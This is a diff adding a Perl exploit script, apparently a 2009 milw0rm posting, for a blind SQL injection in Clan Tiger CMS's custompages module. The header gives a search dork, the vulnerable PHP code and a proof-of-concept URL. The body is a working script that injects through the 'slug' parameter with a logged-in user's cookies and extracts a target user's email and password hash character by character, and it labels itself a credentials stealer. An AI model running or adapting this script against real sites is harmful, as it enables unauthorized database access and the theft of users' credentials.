@@ -1,0 +1,332 @@
+#!/usr/bin/perl
+#***********************************************************************************************
+#***********************************************************************************************
+#**	       										      **
+#**  											      **
+#**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []   []      **
+#   [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+#**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+#**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+#   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    
+#**							                                      **
+#**    											      **
+#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+#**					  ¡PROUD TO BE SPANISH!	                              **
+#**											      **
+#***********************************************************************************************
+#***********************************************************************************************
+#
+#----------------------------------------------------------------------------------------------
+#|       	   	     (custompage.php) BLIND SQL INJECTION		              |
+#|--------------------------------------------------------------------------------------------|
+#|                         	     | CLAN TIGER CMS |		 			      |
+#|  CMS INFORMATION:		      ----------------					      |
+#|										              |
+#|-->WEB: http://www.clantiger.com				   		              |
+#|-->DOWNLOAD: http://www.clantiger.com/download-clan-cms 	   		              |
+#|-->DEMO: http://www.demo.clantiger.com/						      |
+#|-->CATEGORY: CMS / Portals								      |
+#|-->DESCRIPTION: ClanTiger is a content management system specifically designed for gaiming  |
+#| 		clans...								      |
+#|											      |
+#|  CMS VULNERABILITY:									      |
+#|											      |
+#|-->TESTED ON: firefox 2.0.0.20 and IE 7.0.5730 (Default)				      |
+#|-->DORK: "Powered by ClanTiger"							      |
+#|-->CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
+#|-->AFFECT VERSION: LAST = 1.1.1 (1.1 too)						      |
+#|-->Discovered Bug date: 2009-04-12							      |
+#|-->Reported Bug date: 2009-04-12							      |
+#|-->Fixed bug date: Not fixed								      |
+#|-->Info patch (????): Not fixed							      |   
+#|-->Author: YEnH4ckEr									      |
+#|-->mail: y3nh4ck3r[at]gmail[dot]com							      |
+#|-->WEB/BLOG: N/A									      |
+#|-->COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
+#----------------------------------------------------------------------------------------------
+#
+#-----------
+#BUG FILE:
+#-----------
+#
+#Path --> [HOME_PATH]/modules/custompages.php
+#
+#It contents:
+#
+#	function main()
+#	{
+#		
+#		...
+#
+#		$page = new CustomPage();
+#		$page->slug = $_GET['slug'];
+#		$page->getBy(array('slug'));
+#		
+#		if(!$page->id)
+#		{
+#			throw new cccException('The page you are looking for is currently 			unavailable. You may need to STOP! Hammertime. If School Is Out, You 			should try reloading this page.','Page not found');
+#		}
+#		
+#		$tpl->define('title',$page->title);
+#		$tpl->define('content',$page->content); // we allow HTML here, no safeoutput
+#		
+#		$this->pageDetails->setTitle($page->title);
+#		$this->pageDetails->addKeyword($page->keywords);
+#		$this->pageDetails->setDescription($page->description);
+#		
+#		$this->content = $tpl->publish();
+#		$this->display();
+#	}
+#
+#------------
+#CONDITIONS:
+#------------
+#
+#**DB_PREFIX="" (Default) 
+#
+#	maybe: db, db_clan, ...
+#
+#**Exist a custompage
+#
+#**gpc_magic_quotes=off
+#
+#---------------------------------------
+#PROOF OF CONCEPT (BLIND SQL INJECTION):
+#---------------------------------------
+#
+#[HOME_PATH]/modules/custompages.php?slug=the_custom_page' [BLIND SQL INJECTION]
+#
+#---------
+#EXAMPLE:
+#---------
+#
+#[HOME_PATH]/modules/custompages.php?slug=the_custom_page'%20AND%20((SELECT%20length(username)%20from%20members%20WHERE%20id=1)=5)%20/*
+#
+#Result: admin's username has 5 characters (maybe = admin? :P)
+#
+#*******************************************************************
+# ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
+#*******************************************************************
+#-------------------------------------------------------------------
+#*******************************************************************
+# GREETZ TO: JosS and all spanish Hack3Rs community!
+#*******************************************************************
+#
+#-------------------EOF---------------------------------->>>ENJOY IT!
+#
+use LWP::UserAgent;
+use HTML::TreeBuilder 2.96;
+#Subroutines
+sub lw
+{
+	my $SO = $^O;
+	my $linux = "";
+	if (index(lc($SO),"win")!=-1){
+		$linux="0";
+	}else{
+		$linux="1";
+	}		
+	if($linux){
+		system("clear");
+	}
+	else{
+		system("cls");
+		system ("title Clan Tiger CMS (module custompages.php) BLIND SQL Injection Exploit");
+		system ("color 02");
+	}
+}
+sub request {
+	my $cookie="CCC_LANG=en;"." CCC_UID=".$_[0]."; CCC_CODE=".$_[1].";";
+	my $userag = LWP::UserAgent->new;
+	$userag -> agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+	my $request = HTTP::Request -> new(GET => $_[2]);
+	$request->header(cookie => $cookie);
+	my $outcode= $userag->request($request)->as_string;
+	return $outcode;
+}
+sub helper {
+	print "\n\t[**] Clan Tiger CMS - BLIND SQL Injection Exploit\n";
+	print "\t[??] USAGE MODE: [??]\n";
+	print "\t[**] perl $0 [HOST] [PATH] [uid] [code] [slug] [id] [DB_PREFIX]\n";
+	print "\t[**] [HOST]: Web attacked.\n";
+	print "\t[**] [PATH]: Home Path.\n";
+	print "\t[**] [uid]: The CCC_UID cookie.\n";
+	print "\t[**] [code]: The CCC_CODE cookie.\n";
+	print "\t[**] [slug]: Title custompage.\n";
+	print "\t[**] [id]: Exploiting id user. Default: 1 (**optional)\n";
+	print "\t[**] [DB_PREFIX]: Global var needed. Default: null (**optional)\n";
+	print "\t[**] Example: perl $0 www.example.es Clan-tiger-111 f717716... \n"; 
+	print "\t[**] ...2e1a50db06c0f2fe8804885ac2c01390 namecustompage 1 \"\"\n";
+}
+sub mail{
+$output=&request($_[0],$_[1],$_[2]);
+ my $root = HTML::TreeBuilder->new_from_content($output);
+# source file
+$email= $root->look_down('_tag','td','style','width: 70%');
+print "\t-----------------------------------------------------------------\n";
+print "\tMail captured!.Getting password hash. Wait for a moment...\n";
+print "\t-----------------------------------------------------------------\n";
+return $email -> as_text();
+$root->delete();
+}
+sub password {
+#Second password...
+$j=1;
+	$i=48;
+	while(($j<=32) && ($i<=126)){
+		my $finalrequest=$_[4]."'+AND+ascii(substring((SELECT+password+FROM+".$_[0]."members+WHERE+id=".$_[1]."),".$j.",1))=".$i."+/*";
+		$output=&request($_[2],$_[3],$finalrequest);
+		if ( $output =~ (/<title>/.$custompage))
+		{
+			$pass=$pass.chr($i);
+			$j++;
+			$i=47;
+		}
+	if($i==57)
+	{
+		$i=96;
+	}
+#new char
+	$i++; 
+	}
+#Error
+	if(($i>127) || ($j>32)){
+		if(!$pass){
+			print "\t-----------------------------------------------------------------\n";
+			print("\tEXPLOIT FAILED!\n");
+			print("\tFatal error: Datas doesn't find!\n");
+			print "\t-----------------------------------------------------------------\n";
+			exit(1);
+		}
+	}
+return $pass;
+}
+#Main
+&lw;
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t##     Clan Tiger CMS - BLIND SQL Injection Exploit    ##\n\n";
+	print "\t\t##    ++Conditions: Need a register user,a custompage  ##\n\n";
+	print "\t\t##               and DB_PREFIX (default:null)          ##\n\n";
+	print "\t\t##                    Author: Y3nh4ck3r                ##\n\n";
+	print "\t\t##            Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n";
+	print "\t\t##                    Proud to be Spanish!             ##\n\n";
+	print "\t\t#########################################################\n\n";
+	print "\t\t#########################################################\n\n";
+#Init variables
+	my $host=$ARGV[0];
+	my $path=$ARGV[1];
+	my $uid=$ARGV[2];
+	my $code=$ARGV[3];
+	my $custompage=$ARGV[4];
+#Build the uri
+	my $finalhost="http://".$host."/".$path."/index.php?module=custompages&slug=";
+	$finalhost=$finalhost.$custompage;
+#Check all variables needed
+$numArgs = $#ARGV + 1;
+	if($numArgs<=4) 
+	{
+		&helper;
+		exit(1);	
+	}
+#Id-user is optional.Default:1
+	if(!$ARGV[5]){
+		$idhack="1";	
+	}else{
+		$idhack=$ARGV[5];	
+	}
+	if(!$ARGV[6]){
+		$db_prefix="";	
+	}else{
+		$db_prefix=$ARGV[6];	
+	}
+#Testing
+my $finalrequest = $finalhost;
+$output=&request($uid,$code,$finalrequest);
+if ( $output =~ /<div class="title">Access denied<\/div>/)
+{
+	print "\t-----------------------------------------------------------------\n";
+	print "\tYour credentials are not correct! This exploits need login.\n";
+	print "\tOptions: [your-id-user],[your-password] incorrect.\n"; 
+	print "\tExploit failed! No luck!\n";
+	print "\t-----------------------------------------------------------------\n";
+    exit(1);
+}
+if ( $output =~ /<div class="title">Page not found<\/div>/)
+{
+	print "\t-----------------------------------------------------------------\n";
+	print "\tCustom page doesn't exist! Maybe no there on this server!\n";
+	print "\tOption: [slug-get-var] incorrect.\n"; 
+	print "\tExploit failed! No luck!\n";
+	print "\t-----------------------------------------------------------------\n";
+	exit(1);
+}
+if ( $output =~ (/<title>/.$custompage))
+{
+	print "\t-----------------------------------------------------------------\n";
+	print "\tThis Web could be vulnerable!\n";
+	print "\tThe custompage exists!\n";
+	print "\tTesting Blind SQL Injection...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+}else{ 
+	print "\t-----------------------------------------------------------------\n";
+	print "\tCustompage doesn't exist!\n";
+	print "\tEXPLOIT FAILED!\n";
+	print "\t-----------------------------------------------------------------\n";
+exit(1); 
+}	
+#Test blind sql injection
+my $finalrequest=$finalhost."'+AND+1=1+/*";
+$output=&request($uid,$code,$finalrequest);
+if ( $output =~ (/<title>/.$custompage))
+{    
+	print "\t-----------------------------------------------------------------\n";
+	print "\tThis Web is really vulnerable!\n";
+	print "\tTested Blind SQL Injection.\n";		
+	print "\tChecking id user and DB_PREFIX null...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+}else{ 
+	print "\t-----------------------------------------------------------------\n";
+	print "\tThis Web is not vulnerable (Maybe patched)!\n";
+	print "\tEXPLOIT FAILED!\n";
+	print "\t-----------------------------------------------------------------\n";
+exit(1); 
+}	
+#Test if user exists and DB_PREFIX
+my $finalrequest=$finalhost."'+AND+(SELECT+COUNT(*)+from+".$db_prefix."members+WHERE+id=".$idhack.")+/*";
+$output=&request($uid,$code,$finalrequest);
+if ( $output =~ (/<title>/.$custompage))
+{    
+	print "\t-----------------------------------------------------------------\n";
+	print "\tOK...The user exists and DB_PREFIX is '".$db_prefix."'!\n";		
+	print "\tStarting exploit...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+	print "\tWait several minutes...\n"; 
+	print "\t-----------------------------------------------------------------\n";
+}else{ 
+	print "\t-----------------------------------------------------------------\n";
+	print "\tUser doesn't exists or DB_PREFIX not '".$db_prefix."'\n";		
+	print "\tEXPLOIT FAILED!\n";
+	print "\t-----------------------------------------------------------------\n";
+exit(1); }	
+#OK, now we get the mail user from web 
+#i got it from blind sql but this method is faster and reduce time of injection
+#First email...
+my $hostmail="http://".$host."/".$path."/index.php?module=profiles&action=view&id=".$idhack;
+$mail=&mail($uid,$code,$hostmail);
+$passhash=&password($db_prefix,$idhack,$uid,$code,$finalhost);
+print "\n\t\t*************************************************\n";
+print "\t\t****  EXPLOIT EXECUTED (CREDENTIALS STEALER) ****\n";
+print "\t\t*************************************************\n\n";
+print "\t\tUser-id:".$idhack."\n";
+print "\t\tUser-email:".$mail."\n";
+print "\t\tUser-password(hash):".$passhash."\n\n";
+print "\n\t\t----------------------FINISH!--------------------\n\n";
+print "\t\t---------------Thanks to: y3hn4ck3r--------------\n\n";
+print "\t\t------------------------EOF----------------------\n\n";
+exit(1);
+#Ok...all job done
+
+# milw0rm.com [2009-04-17]
